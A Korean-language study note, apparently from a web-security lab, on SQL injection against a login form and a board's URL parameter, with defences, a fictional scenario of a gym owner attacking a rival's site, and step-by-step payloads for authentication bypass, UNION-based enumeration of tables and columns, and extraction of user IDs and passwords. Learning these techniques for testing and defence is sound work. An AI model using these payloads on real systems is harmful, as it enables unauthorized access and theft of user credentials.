## 로그인 - SQL Injection

### 정상 로그인

- 로그인폼에 ID와 PW를 입력하여 로그인 버튼을 누른다

- 로그인폼에서 전송 된 파라미터 값을 DB와 비교 후 일치하는 값이 있을 경우 통과 된다.

<bt />

### 비정상 로그인

#### 주석처리

- ID 값 뒤에 ‘ --’를 넣어 검증 쿼리의 뒷 부분을 주석처리한다.

- PW 검증 없이 로그인 성공

<bt />

#### blind

- PW에 ‘ or’1’=’1’을 넣어 항상 참이 되도록 쿼리를 조작가장 먼저 가입 된 계정으로 로그인 성공, 보통 관리자 계정

- union : 2개 이상의 쿼리를 연결하여 DB 내용을 얻어 냄
  - 원래의 요청에 한 개의 추가 쿼리를 삽입하여 컬럼 갯수, 위치, 정보를 얻는다.

- 컬럼의 개수와 데이터 형식을 맞춰야 한다

#### union

- 2개 이상의 쿼리를 연결하여 DB 내용을 얻어 냄
- ID입력창에 `'or'1'='1' order by 5--` 를 넣어 게시물이 나오지 않는 번호가 나온다면 컬럼의 수를 알 수 있다.

- ID입력창에  `' union select 1,2,3,4,5,(컬럼수만큼) --` 을 반복하여 로그인이 될때까지 확인하여 컬럼의 수를 알 수 있다.

<bt />

#### 방어 방법

- preparedStatement 클래스와 하위 메소드 executeQuery(), execute(), executeUpdate()를 사용

- preparedStatement 클래스를 사용할 수 없는 환경이라면, 입력 값을 필터링 한 후 사용
  - 필터링 기준은 SQL 구문 제한, 특수문자 제한, 길이제한을 복합적으로 사용.
  - 키워드를 공격과 의미 없는 단어로 치환하는 필터 작성

- 에러메시지 노출되지 않도록 페이지 제작

- 특수문자, 불필요한 문자 체크 등의 블랙리스트 방식보다는 영어, 숫자인지 등을 체크하는 화이트리스트 방식을 권장

<bt />

### 시나리오

- 피트니스 센터를 운영중인 박튼튼씨는 요즘 회원이 많이 줄었다. 
- 옆 동네 김건강씨네 피트니스 센터에는 회원이 늘고 있다는 소문이다.
- 박튼튼씨는 자신의 회원들을 빼낸다고 생각하여 김건강피트니스 사이트에서 정보를 얻기 위해 SQL 삽입 공격을 감행한다
- 먼저, 김건강피트니스에 다니는 지인의 ID를 알아내 로그인 창에 `[ID] '--`를 넣어 비밀번호 검증 없이 로그인을 시도한다. 
- 다른 피트니스에서 넘어오는 회원에게 할인 행사를 하는 것을 확인했다.
- 이에 분노한 박튼튼씨는 회원 정보를 지우거나 조작하는 등의 직접적인 공격을 하기로 결심한다
- ID와 PW에 ‘ or’1’=’1’을 넣어 항상 참이 되도록 조작하여 관리자 계정으로 로그인하는 데 성공한다.

<br />

### 공격 방법

```sql
' or '1'='1
```

- 위 처럼 쿼리문 중간에 들어갔을 때 항상 참이 되는 구문을 입력

```java
"SELECT * FROM [USERTABLE] WHERE ID ='" + ID + "' AND PW ='" + PW + "'";
```

위와 같은 코드에 들어가면

```java
"SELECT * FROM [USERTABLE] WHERE ID ='' or '1'='1' AND PW ='' or '1'='1'";
```

이렇게 항상 참일수 밖에 없는 조건식이 완성 된다.

<br/>

- ID, PW 중 하나를 넣고 사용해도 인증 우회가 가능하고 둘 다 넣을 경우 가장 먼저 가입 된 계정으로 로그인 된다.
  - 보통 관리자 계정을 가장 먼저 생성하기 때문에 관리자 계정으로 로그인 될 확률이 높다.

<br />

```sql
user' --
```

- 또는 위 처럼 ID 검증 이후의 쿼리문 을 주석처리하여 PW 검증 없이 로그인 가능

```java
"SELECT * FROM [USERTABLE] WHERE ID ='" + ID + "' AND PW ='" + PW + "'";
```

위와 같은 코드에 들어가면

```java
"SELECT * FROM [USERTABLE] WHERE ID ='user' --' AND PW =;
```

 `--`이후의 문장은 주석처리 되어 비밀번호 검증 없이 로그인이 가능하다

<br />

### 1.컬럼 개수 알아내기

```sql
'or'1'='1' union select null --
'or'1'='1' union select null,null--
'or'1'='1' union select null,null,null--
'or'1'='1' union select null,null,null,null--
```

- ID입력창에 에러페이지가 나오지 않을 때까지 반복

- 안나오면 null 개수가 컬럼의 수

<br />

```sql
'or'1'='1' order by 1--
'or'1'='1' order by 2--
'or'1'='1' order by 3--
'or'1'='1' order by 4--
```

- 에러페이지가 나올 때까지 반복
  - 나오면 직전 숫자가 컬럼의 개수

<br />

### 2. DB 이름 알아내기

```sql
'or'1'='1' union select null,null, database(),null --
```

- 3번 컬럼 자리에 데이터베이스 이름이 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

##### 3. 테이블 이름 알아내기

```sql
'or'1'='1' union select null,group_concat(table_name),null,null from information_schema.tables where table_type='TABLE'--
```

- 테이블 이름들이 한줄로 묶여서 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

##### 결과 : USERSTBL,BOARDSTBL

<br />

### 4. 컬럼명 알아내기

- 컬럼이름들이 한줄로 묶여서 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

<br />

#### USERSTBL

```sql
'or'1'='1' union select null,null, group_concat(column_name),null from information_schema.columns where table_name='USERSTBL'--
```

##### 결과 : ID,USERID,USERPW,USERNAME

<br />

### 5. 데이터 추출하기

#### USERSTBL

```sql
'or'1'='1' union select null,group_concat(USERID),null,null from USERSTBL--
'or'1'='1' union select null,group_concat(USERPW),null,null from USERSTBL--
'or'1'='1' union select null,group_concat(USERNAME),null,null from USERSTBL--
```

##### 결과 : Admin,Manager,User,Test,Secure,Ceo,Cto

##### 결과 : Admin1234,Manager1234,User1234,Test1234,Secure1234,Ceo1234,Cto1234

##### 결과 : 관리자,매니저,사용자,테스터,보안,대표이사,기술이사

___

## 게시판 - SQL Injection
### 정상 조회

검색창에 제목, 내용 선택 창이 있다.

제목 또는 내용을 선택 한 뒤 검색어를 입력하고 검색 버튼을 누른다

해당 검색어가 포함 된 데이터가 출력된다

<bt />

### 비정상 조회

#### blind

- 게시물 번호에 no=1 and 1=1 또는 no=1 and 1=0을 넣어 항상 참 또는 항상 거짓이 되도록 쿼리를 조작가장 먼저 가입 된 계정으로 로그인 성공, 보통 관리자 계정

<bt />

#### union

- 2개 이상의 쿼리를 연결하여 DB 내용을 얻어 냄게시물 번호 뒤에 no=0 order by 1 -- 를 넣어 게시물이 나오지 않는 번호가 나온다면 컬럼의 수를 알 수 있다.

- 게시물 번호 뒤에 no=0 union select 1,2,3,4,5,(컬럼수만큼) -- 을 넣어 게시물의 컬럼 위치를 확인 한다

<bt />

### 방어 방법

- preparedStatement 클래스와 하위 메소드 executeQuery(), execute(), executeUpdate()를 사용

- preparedStatement 클래스를 사용할 수 없는 환경이라면, 입력 값을 필터링 한 후 사용필터링 기준은 SQL 구문 제한, 특수문자 제한, 길이제한을 복합적으로 사용.키워드를 공격과 의미 없는 단어로 치환하는 필터 작성에러메시지 노출되지 않도록 페이지 제작

- 특수문자, 불필요한 문자 체크 등의 블랙리스트 방식보다는 영어, 숫자인지 등을 체크하는 화이트리스트 방식을 권장

<bt />

### 시나리오

피트니스 센터를 운영중인 박튼튼씨는 요즘 회원이 많이 줄었다.

 옆 동네 김건강씨네 피트니스 센터에는 회원이 늘고 있다는 소문이다.

박튼튼씨는 자신의 회원들을 빼낸다고 생각하여 김건강씨네 회원 목록을 알아내기 위해 김건강피트니스 사이트에 SQL 삽입 공격을 감행한다

먼저 게시판에서 아무런 글이나 눌러 보고 url에 쿼리 값이 어떤 기준으로 달리는지 확인 한다.

이후 union 문을 이용하여 게시판 컬럼 개수를 알아 낸다게시판 컬럼 개수를 알아낸 후 이를 이용해 DB이름과 테이블 리스트를 알아 낸다사용자 정보로 추정되는 테이블을 발견했다. 

마찬가지로 사용자 정보 테이블의 컬럼 종류를 알아낸다.

컬럼에서 사용자 ID와 PW를 탈취하는데 성공 한다

<bt />

### 공격 방법

```sql
board?bno=1
```

- 위와 같이 특정 쿼리 값으로 정보를 조회하는 곳에서 사용
- 밑에서 나오는 예시들은 쿼리값에 붙여서 사용한다

<br />

### 1.컬럼 개수 알아내기

```sql
board?bno=1' union select null--
board?bno=1' union select null,null--
board?bno=1' union select null,null,null--
board?bno=1' union select null,null,null,null--
```

- 에러페이지가 나오지 않을 때까지 반복

- 안나오면 null 개수

<br />

```sql
board?bno=1' oder by 1--
board?bno=1' oder by 2--
board?bno=1' oder by 3--
board?bno=1' oder by 4--
```

- 에러페이지가 나올 때까지 반복
  - 나오면 직전 숫자가 컬럼의 개수

<br />

### 2. DB 이름 알아내기

```sql
board?bno=-99' union select 1,2, database(),4 --
```

- 3번 컬럼 자리에 데이터베이스 이름이 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

##### 3. 테이블 이름 알아내기

```sql
board?bno=-99' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_type='TABLE'--

- 테이블 이름들이 한줄로 묶여서 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

##### 결과 : USERSTBL,BOARDSTBL

<br />

### 4. 컬럼명 알아내기

- 컬럼이름들이 한줄로 묶여서 표시
- 절대 사용되지 않을 인덱스 값을 넣어 뒤에 오는 명령이 실행 되도록 한다

<br />

#### USERSTBL

```sql
board?bno=-99' union select 1,2, group_concat(column_name),4 from information_schema.columns where table_name='USERSTBL'--
```

##### 결과 : ID,USERID,TITLE,CONTENT

#### BOARDSTBL

```sql
board?bno=-99' union select 1,2, group_concat(column_name),4 from information_schema.columns where table_name='BOARDSTBL'--
```

##### 결과 : ID,USERID,USERPW,USERNAME

<br />

### 5. 데이터 추출하기

#### USERSTBL

```sql
board?bno=-99' union select 1,group_concat(USERID),3,4 from USERSTBL--
board?bno=-99' union select 1,group_concat(USERPW),3,4 from USERSTBL--
board?bno=-99' union select 1,group_concat(USERNAME),3,4 from USERSTBL--
```

##### 결과 : Admin,Manager,User,Test,Secure,Ceo,Cto

##### 결과 : Admin1234,Manager1234,User1234,Test1234,Secure1234,Ceo1234,Cto1234

##### 결과 : 관리자,매니저,사용자,테스터,보안,대표이사,기술이사

#### BOARDSTBL

```sql
board?bno=-99' union select 1,group_concat(USERID),3,4 from BOARDSTBL--
board?bno=-99' union select 1,group_concat(TITLE),3,4 from BOARDSTBL--
board?bno=-99' union select 1,group_concat(CONTENT),3,4 from BOARDSTBL--

```

##### 결과 : Admin,Manager,User,Test

##### 결과 : 공지사항,매니저입니다,사용자입니다,테스터입니다

##### 결과 : 공지사항입니다. 다양한 테스트를 시도해 보십시오.,새로 매니저가 되었습니다. 잘부탁드립니다.,사용자로 가입했습니다. 안녕하세요.,테스트해보세요

<br />

##### 모아서 한번에 확인하기

``` sql
board?bno=-99%27%20union%20select%201,group_concat(concat_ws(':',%20userid,title,content)),3,4%20from%20boardstbl--
```

##### 결과 : Admin:공지사항:공지사항입니다. 다양한 테스트를 시도해 보십시오.,Manager:매니저입니다:새로 매니저가 되었습니다. 잘부탁드립니다.,User:사용자입니다:사용자로 가입했습니다. 안녕하세요.,Test:테스터입니다:테스트해보세요

<br />

##### 번외 : URL Escape 문자

| 문자  | url  | 문자 | url  | 문자 | url  | 문자 | url  | 문자 | url  |
| ----- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| space | %20  | (    | %28  | :    | %3A  | [    | %5B  | `    | %60  |
| !     | %21  | )    | %29  | ;    | %3B  | \\   | %5C  | {    | %7B  |
| "     | %22  | *    | %2A  | <    | %3C  | ]    | %5D  | \|   | %7C  |
| #     | %23  | +    | %2B  | =    | %3D  | ^    | %5E  | }    | %7D  |
| $     | %24  | ,    | %2C  | >    | %3E  | _    | %5F  | ~    | %7E  |
| %     | %25  | -    | %2D  | ?    | %3F  | .    | .    | .    | .    |
| &     | %26  | .    | %2E  | @    | %40  | .    | .    | .    | .    |
| '     | %27  | /    | %2F  | .    | .    | .    | .    | .    | .    |